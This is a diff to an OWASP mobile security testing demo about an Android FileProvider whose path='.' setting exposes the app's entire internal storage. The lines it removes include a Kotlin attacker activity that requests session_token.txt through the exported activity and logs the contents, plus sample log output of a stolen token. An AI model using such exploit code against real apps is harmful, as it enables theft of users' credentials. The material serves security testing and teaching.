@@ -3,7 +3,6 @@ platform: android
 title: Oversharing via FileProvider with Unrestricted Path Configuration
 id: MASTG-DEMO-0122
 code: [xml, kotlin]
-tools: [MASTG-TOOL-0110]
 kind: fail
 test: MASTG-TEST-0357
 ---
@@ -32,47 +31,12 @@ The rule flags the `files-path` element with `path="."`.
 
 ## Evaluation
 
-The test case fails because the FileProvider path configuration exposes the entire `filesDir` instead of only the intended `reports/` subdirectory.
+The test case fails because the `FileProvider` path configuration exposes the entire `filesDir` instead of only the intended `reports/` subdirectory.
 
-- The `mastg-android-fileprovider-broad-scope.yml` rule flags `path="."` in `filepaths.xml`, confirming that any file in the app's internal storage can be shared via a URI grant — not just the intended lab report PDFs.
-- An attacker who tricks the app into sharing a URI (e.g., by sending a crafted intent) can request `session_token.txt` or any other file under `filesDir` using the same `org.owasp.mastestapp.fileprovider` authority.
-- The fix is to restrict the path to the specific subdirectory: `path="reports/"`.
+The rule flags the `files-path` element in `filepaths.xml`:
 
-An attacker app could retrieve the secret token from the provider app and print it to the logs.
+- `path="."` is an overly broad scope that grants URI-grant access to every file under `filesDir`, not just the intended `reports/` subdirectory. Any app that receives a URI grant from the victim's `ShareReportActivity` can request any filename — including sensitive files such as `session_token.txt`.
 
-```java
-class AttackerActivity : ComponentActivity() {
-    private val launcher = registerForActivityResult(
-        ActivityResultContracts.StartActivityForResult()
-    ) { result ->
-        val uri = result.data?.data ?: run {
-            Log.e("EXFIL", "no URI returned"); return@registerForActivityResult
-        }
-        contentResolver.openInputStream(uri)?.bufferedReader()?.use { reader ->
-            Log.e("EXFIL", "Got from victim: ${reader.readText()}")
-        }
-    }
+Additionally, `ShareReportActivity` is declared with `android:exported="true"` in the AndroidManifest, meaning any external app can send it a crafted intent with an arbitrary `file_name` extra and receive back a valid `content://` URI.
 
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-
-        val intent = Intent().apply {
-            setClassName(
-                "org.owasp.mastestapp",
-                "org.owasp.mastestapp.MastgTest\$ShareReportActivity"
-            )
-            // attacker picks the target file
-            putExtra("file_name", "session_token.txt")
-        }
-        launcher.launch(intent)
-    }
-}
-```
-
-When using `adb logcat -s EXFIL` you will see the output of the attacker app.
-
-```bash
-adb logcat -s EXFIL
---------- beginning of main
-<timestamp> 12521 12521 E EXFIL   : Got from victim: sess_7f3a9b1e4d2c8f0a5e6b3c1d9f4a2e7b
-```
+> This attack cannot be reproduced with `adb` alone. `adb shell am start` can launch the exported activity, but it never receives the returned result intent or the temporary URI permission grant, so it can't read the file — and reading it via `su -c 'content read …'` only works because root can read any app's storage directly, which bypasses the provider rather than exploiting it. Demonstrating the real vulnerability therefore requires a separate attacker app that calls the activity with `startActivityForResult()` and reads the granted `content://` URI.
